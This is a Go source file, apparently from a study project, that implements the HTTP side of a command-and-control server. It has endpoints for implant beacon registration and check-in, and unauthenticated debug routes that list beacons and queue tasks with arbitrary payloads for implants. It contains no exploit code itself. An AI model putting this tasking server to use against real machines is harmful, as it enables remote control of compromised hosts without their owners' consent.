package c2

import (
	"fmt"
	"net/http"
	"time"
	
	"github.com/gin-gonic/gin"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/handlers"
	"xhc2_for_studying/server/store"
)

type HTTPServer struct {
	engine      *gin.Engine
	beaconStore *store.BeaconStore
	taskStore   *store.ServerTaskStore
}

type debugCreateTaskRequest struct {
	TaskID    string `json:"task_id"`
	ImplantID string `json:"implant_id"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
}

func NewHTTPServer(beaconStore *store.BeaconStore, taskStore *store.ServerTaskStore) *HTTPServer {
	engine := gin.New()
	engine.Use(gin.Recovery(), gin.Logger())
	
	srv := &HTTPServer{
		engine:      engine,
		beaconStore: beaconStore,
		taskStore:   taskStore,
	}
	
	srv.registerRoutes()
	
	return srv
}

func (s *HTTPServer) registerRoutes() {
	s.engine.GET("/healthz", s.handleHealthz)
	s.engine.GET("/debug/beacons", s.handleListBeacons)
	s.engine.POST("/debug/tasks", s.handleCreateDebugTask)
	s.engine.POST("/beacon/register", s.handleRegister)
	s.engine.POST("/beacon/checkin", s.handleCheckin)
}

func (s *HTTPServer) Run(addr string) error {
	return s.engine.Run(addr)
}

func (s *HTTPServer) handleHealthz(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
	})
}

func (s *HTTPServer) handleListBeacons(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"beacon_ids": s.beaconStore.ListIDs(),
	})
}

func (s *HTTPServer) handleCreateDebugTask(c *gin.Context) {
	var req debugCreateTaskRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": err.Error(),
		})
		return
	}
	if req.ImplantID == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "implant_id is required",
		})
		return
	}
	if req.Type == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "type is required",
		})
		return
	}
	
	taskID := req.TaskID
	if taskID == "" {
		taskID = fmt.Sprintf("task-%d", time.Now().UnixNano())
	}
	
	task := &core.ServerTask{
		TaskID:    taskID,
		Type:      req.Type,
		ImplantID: req.ImplantID,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	s.taskStore.AddTask(task)
	
	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"task": gin.H{
			"task_id":    task.TaskID,
			"implant_id": task.ImplantID,
			"type":       task.Type,
			"payload":    task.Payload,
			"status":     task.Status,
		},
	})
}

func (s *HTTPServer) handleRegister(c *gin.Context) {
	var req beaconProtocol.RegisterRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": err.Error(),
		})
		return
	}
	
	resp, err := handlers.HandleRegister(s.beaconStore, &req, c.ClientIP())
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": err.Error(),
		})
		return
	}
	
	c.JSON(http.StatusOK, resp)
}

func (s *HTTPServer) handleCheckin(c *gin.Context) {
	var req beaconProtocol.CheckinRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": err.Error(),
		})
		return
	}
	
	fmt.Println("checkin beacon_id:", req.BeaconID)
	fmt.Println("known beacon_ids:", s.beaconStore.ListIDs())
	
	resp, err := handlers.HandleCheckin(s.beaconStore, s.taskStore, &req, c.ClientIP())
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": err.Error(),
		})
		return
	}
	
	c.JSON(http.StatusOK, resp)
}
